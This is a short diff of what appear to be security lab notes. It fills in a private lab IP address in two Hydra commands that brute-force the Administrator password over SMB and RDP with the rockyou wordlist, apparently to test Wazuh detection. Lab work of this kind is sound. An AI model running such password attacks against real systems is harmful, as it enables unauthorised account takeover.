@@ -14,8 +14,8 @@ $ ipconfig
  #### Use
 - Used to try many passwords automatically on a service
 ```
-$ hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt smb://<Windows_ip>
-$ hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<Windows_ip>
+$ hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.0.165
+$ hydra -I -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.0.165
 ```
 ![Hydra-loginattempt](screenshots/wazuh_hydra_smb_rdp.png)
 
